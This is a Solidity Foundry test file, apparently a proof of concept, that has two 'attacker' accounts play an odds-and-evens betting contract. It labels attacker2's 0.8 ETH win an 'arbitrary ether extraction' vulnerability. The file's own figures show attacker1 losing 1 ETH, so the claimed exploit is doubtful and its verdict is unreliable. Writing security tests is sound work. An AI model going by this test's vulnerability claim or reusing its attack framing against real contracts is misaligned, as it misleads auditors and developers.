// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/odds_and_evens.sol";

contract OddsAndEvensTest is Test {
    OddsAndEvens game;
    address attacker1 = makeAddr("attacker1");
    address attacker2 = makeAddr("attacker2");

    function setUp() public {
        game = new OddsAndEvens();
        vm.deal(attacker1, 1 ether);
        vm.deal(attacker2, 1 ether);
    }

    function testArbitraryEtherExtraction() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialAttacker2Balance = attacker2.balance;
        uint256 initialContractBalance = address(game).balance;
        console.log("Attacker2 Initial Balance: %s", initialAttacker2Balance);
        console.log("Contract Initial Balance: %s", initialContractBalance);

        console.log("--- Trigger (Attack Steps) ---");
        vm.prank(attacker1);
        game.play{value: 1 ether}(1);  // Odd number

        vm.prank(attacker2);
        game.play{value: 1 ether}(2);  // Even number - wins 1.8 ETH (sum=3 odd)

        console.log("--- AFTER-Trigger State ---");
        uint256 finalAttacker2Balance = attacker2.balance;
        uint256 finalContractBalance = address(game).balance;
        console.log("Attacker2 Final Balance: %s", finalAttacker2Balance);
        console.log("Contract Final Balance: %s", finalContractBalance);

        uint256 attackerProfit = finalAttacker2Balance - initialAttacker2Balance;
        uint256 contractBalanceChange = finalContractBalance - initialContractBalance;

        if (attackerProfit == 0.8 ether && contractBalanceChange == 0.2 ether) {
            console.log("Vulnerability Exists: Attacker successfully extracted 0.8 ETH profit and contract balance increased by 0.2 ETH as expected");
        } else {
            console.log("Vulnerability not Exist: The attack did not result in the expected state changes");
        }
    }
}